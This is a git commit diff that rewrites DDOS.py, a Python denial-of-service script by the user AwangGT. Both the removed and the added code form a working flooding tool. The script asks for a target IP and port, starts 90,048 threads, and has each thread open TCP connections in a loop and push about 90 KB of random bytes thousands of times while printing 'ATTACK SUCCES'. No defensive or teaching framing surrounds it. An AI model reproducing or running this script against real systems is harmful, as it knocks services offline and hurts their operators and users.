2a6b713584000c65bb55a4860f5223c4878e9d51
AwangGT <95455847+AwangGT@users.noreply.github.com>
2021-12-03 03:17:00 +0000

    Update DDOS.py

--- DDOS.py
+++ DDOS.py
@@ -2,31 +2,29 @@
 import random
 import socket
 import threading
+import time
 
-print("[+] TOOL BY Awang ")
-
-ip = str(input("[+] Enter RDP IP : "))
-port = int(input("[+] Enter RDP Port (80)   : "))
-times = 90048
+print(" SUBSCRIBE AwangGT ")
+ip = str(input(" IP : "))
+port = int(input(" Port : "))
+kimak = str(input("ENTER TO START ATTACK :"))
+times = 10000
 threads = 90048
-
-def run():
-    data = random._urandom(90098)
-    i = random.choice(("[*]","[!]","[#]"))
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip,port))
-            s.send(data)
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-                s.send(data)
-            print(i +" Sent!!!")
-        except socket.error:
-            s.close()
-            print("[!] ATTACK IP ",ip," With Port : ",port,"!")
+def run2():
+	data = random._urandom(90048)
+	i = random.choice(("[-]","[+]","[#]","[*]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"SENT ")
+		except:
+			s.close()
+			print(i +"ATTACK SUCCES ")
 
 for y in range(threads):
-    th = threading.Thread(target = run)
-    th.start()
+		th = threading.Thread(target = run2)
+		th.start()
